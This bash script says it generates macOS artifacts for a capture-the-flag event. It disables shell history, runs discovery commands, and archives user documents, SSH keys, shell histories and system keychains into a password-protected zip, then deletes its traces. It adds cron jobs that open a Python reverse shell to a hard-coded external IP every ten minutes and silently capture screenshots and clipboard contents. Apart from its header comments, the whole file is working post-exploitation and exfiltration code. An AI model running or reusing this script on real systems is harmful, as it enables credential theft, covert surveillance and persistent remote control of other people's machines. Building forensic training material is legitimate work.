#!/bin/bash
# script to generate OS X artifacts for CTF event
# Jon Nelson, jnelson@carbonblack.com

out=/Volumes/Corp\ Share/.mac-disc.txt
fw=/Volumes/Corp\ Share/.fw.txt
loot=/Volumes/Corp\ Share/.mac-loot.tar

#Disable history for this session
set +o history

# Discovery and store to file
declare -a cmds=("date" "who" "mount" "ps aux" "lsof -nP -i:1-65535" "netstat -r" "ifconfig -a" "find /Applications/ /System/ /Users/ /usr/ /bin/  -perm u=s,g=s")
for i in "${cmds[@]}";do 
	echo -e "\n$i" >> "$out"
	printf '=%.0s' {1..100} >> "$out" 
	echo -e "\n" >> "$out"
	eval "$i" >> "$out"
done
# Put results in an archive
tar rf "$loot" "$out"

# Find docs and put them in the archive
find /Users/ -name "*.doc" -o -name "*.xls" -o -name "*.pdf" -type f | xargs tar cf "$loot"

# Find ssh folders and put them in the archive
for i in $(ls /Users 2>/dev/null);do 
	if ls /Users/$i/.ssh 2>/dev/null;then 
		tar rf "$loot" /Users/$i/.ssh 2>/dev/null	
	fi
	# Also grab some other files
	tar rf "$loot" /Users/$i/.{bash_history,bashrc,bash_profile} /Users/$i/Library/Keychains  2>/dev/null
done

# Other files for the archive
tar rf "$loot" /System/Library/Keychains /Library/Keychains

# Dump firewall settings
/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate --getblockall --getstealthmode --getloggingmode --getloggingopt >> "$fw"
tar rf "$loot" "$fw"

# Zip everything
zip -P m90*aHEf2FHY "$loot".zip "$loot"
rm -f "$loot" "$out" "$fw"

# Add reverse shell reaching out every 10 minutes
crontab -l > .cron.tmp
echo "0-59/10 * * * * python -c 'import socket, subprocess, os; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("174.138.4.185",7387)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash", "-i"]);'" >> .cron.tmp
# Add job to capture up to 10 desktops and the clipboard every five minutes
echo "0-59/5 * * * * /usr/sbin/screencapture -x /tmp/.ss-"$(date "+\%s")"-{1..10}" >> .cron.tmp
echo "0-59/5 * * * * pbpaste >> /tmp/.cb-"$(date "+\%s")"" >> .cron.tmp
crontab .cron.tmp
rm -f .cron.tmp